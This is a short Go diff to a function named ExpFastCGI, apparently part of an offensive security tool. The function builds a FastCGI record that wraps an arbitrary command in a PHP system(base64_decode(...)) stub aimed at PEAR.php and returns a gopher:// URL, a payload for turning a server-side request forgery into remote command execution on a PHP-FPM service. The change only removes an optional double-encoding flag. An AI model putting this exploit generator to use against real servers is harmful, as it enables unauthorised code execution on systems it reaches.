@@ -10,7 +10,7 @@ import (
 )
 
 // ExpFastCGI -
-func ExpFastCGI(addr string, cmd, filename string, encode bool) (string, error) {
+func ExpFastCGI(addr string, cmd, filename string) (string, error) {
 	// "/usr/share/php/PEAR.php"
 	cmd = fmt.Sprintf(
 		`<?php system(base64_decode('%s'));?>`,
@@ -27,9 +27,5 @@ func ExpFastCGI(addr string, cmd, filename string, encode bool) (string, error) 
 		"DOCUMENT_ROOT":   "/",
 	}
 	r := fastcgi.NewFastCGIRecord(env, []byte(cmd))
-	p := url.QueryEscape(string(r))
-	if encode {
-		p = url.QueryEscape(replaceFastCGIPayload(p))
-	}
-	return fmt.Sprintf("gopher://%s/_%s", addr, replaceFastCGIPayload(p)), nil
+	return fmt.Sprintf("gopher://%s/_%s", addr, replaceFastCGIPayload(url.QueryEscape(string(r)))), nil
 }
